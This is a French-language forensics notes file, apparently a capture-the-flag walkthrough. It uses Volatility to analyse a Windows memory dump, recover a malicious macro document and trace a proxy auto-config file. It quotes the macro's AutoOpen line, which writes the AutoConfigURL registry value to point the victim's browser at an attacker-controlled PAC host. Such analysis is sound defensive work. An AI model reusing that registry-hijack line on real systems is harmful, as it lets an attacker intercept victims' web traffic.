@@ -1,0 +1,30 @@
+# Page utile montrant pas mal de "traductions" entre les versions 2 et 3 de Volatility :
+# https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-examples
+
+~/.local/bin/vol -f memory.dmp windows.netscan
+
+~/.local/bin/vol -f memory.dmp windows.pslist
+
+~/.local/bin/vol -f memory.dmp windows.cmdline --pid 3248
+# => 3248    WINWORD.EXE     "C:\Program Files\Microsoft Office\Office15\WINWORD.EXE" /n "C:\Users\fraf\Downloads\Very_sexy.docm
+
+~/.local/bin/vol -f memory.dmp  dumpfiles --pid 3248 | grep docm
+
+mkdir dump
+
+~/.local/bin/vol -f memory.dmp  -o "dump" windows.dumpfiles --pid 3248 --virtaddr 0x84ec5988
+
+libreoffice dump/file.0x84ec5988.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat
+# On trouve la ligne suivante dans "AutoOpen" :
+# myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL", "http://192.168.0.19:8080/BenNon.prox", "REG_SZ"
+
+~/.local/bin/vol -f memory.dmp windows.vadyarascan.VadYaraScan --yara-rules "192.168.0.19"
+# Bien noter les offsets et/ou les valeurs
+
+hexeditor memory.dmp
+# On trouve un "FindProxyForURL" aux adresses trouvées avant et on en déduit qu'il y a un fichier .pac gérant le proxy
+# Ce fichier est une précieuse source d'informations
+
+strings memory.dmp | grep FindProxyForURL -A 10 -B 10 -i
+# On retrouve facilement le nom de domaine
+# On peut aussi le trouver directement dans le dump hexadécimal
